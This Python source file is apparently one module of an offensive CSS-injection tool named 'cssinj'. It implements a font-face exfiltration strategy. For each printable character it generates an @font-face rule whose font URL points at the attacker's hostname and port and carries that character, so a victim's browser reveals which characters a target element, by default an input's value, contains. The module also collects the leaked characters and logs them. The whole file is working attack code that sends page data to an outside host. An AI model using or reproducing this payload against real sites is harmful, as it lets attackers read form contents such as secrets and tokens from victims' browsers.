import asyncio
import urllib.parse

from cssinj.client import Client
from cssinj.console import Console, LogLevel
from cssinj.strategies.base import BaseExfiltrationStrategy
from cssinj.utils import default
from cssinj.utils.dom import Attribut, Element


class FontFaceStrategy(BaseExfiltrationStrategy):
    """
    Font face exfiltration strategy.
    Exfiltrates text content using unicode-range font loading.
    Note: Only detects which characters are present, not their order.
    """

    name = 'font-face'

    def __init__(
        self,
        hostname: str,
        port: int,
        element: str = 'input',
        attribut: str = 'value',
        timeout: float = 3.0,
    ) -> None:
        super().__init__(hostname, port, element, attribut, timeout)
        self._timeout_tasks: dict[int, asyncio.Task[None]] = {}
        self._ended: set[int] = set()

    def generate_start_payload(self, client: Client) -> str:
        client.data = ''  # Reset data for this client
        self._ended.discard(client.id)
        return self._generate_font_face(client)

    def generate_next_payload(self, client: Client) -> str:
        return self._generate_font_face(client)

    def handle_valid(self, client: Client, data: str) -> str:
        # Accumulate characters (note: order is not guaranteed)
        if data not in client.data:
            client.data += data

        # Cancel existing timeout task
        existing = self._timeout_tasks.pop(client.id, None)
        if existing is not None:
            existing.cancel()

        # Start new timeout task
        self._timeout_tasks[client.id] = asyncio.create_task(self._wait_for_timeout(client))

        return 'valid'

    def handle_end(self, client: Client) -> str:
        if client.id in self._ended:
            return 'end'
        self._ended.add(client.id)

        # Cancel any pending timeout for this client
        pending = self._timeout_tasks.pop(client.id, None)
        if pending is not None and not pending.done():
            pending.cancel()

        # Create element with the exfiltrated text
        element = Element(name=self.element)
        element.attributs.append(Attribut(name='textContent', value=client.data))
        client.elements.append(element)

        Console.log(
            LogLevel.END_EXFILTRATION,
            f'[{client.id}] - Characters found in {self.element}: {client.data}',
        )

        client.data = ''
        return 'end'

    def _generate_font_face(self, client: Client) -> str:
        css = ''
        for char in default.PRINTABLE:
            encoded = urllib.parse.quote_plus(char)
            unicode_point = f'U+{ord(char):04X}'
            css += (
                f'@font-face{{'
                f'font-family:exfil;'
                f'src:url("//{self.hostname}:{self.port}/v?cid={client.id}&t={encoded}");'
                f'unicode-range:{unicode_point};'
                f'}}'
            )
        css += f'{self.element}{{font-family:exfil;}}'
        return css

    async def _wait_for_timeout(self, client: Client) -> None:
        """Wait for timeout then trigger end of exfiltration."""
        await asyncio.sleep(self.timeout)
        self.handle_end(client)
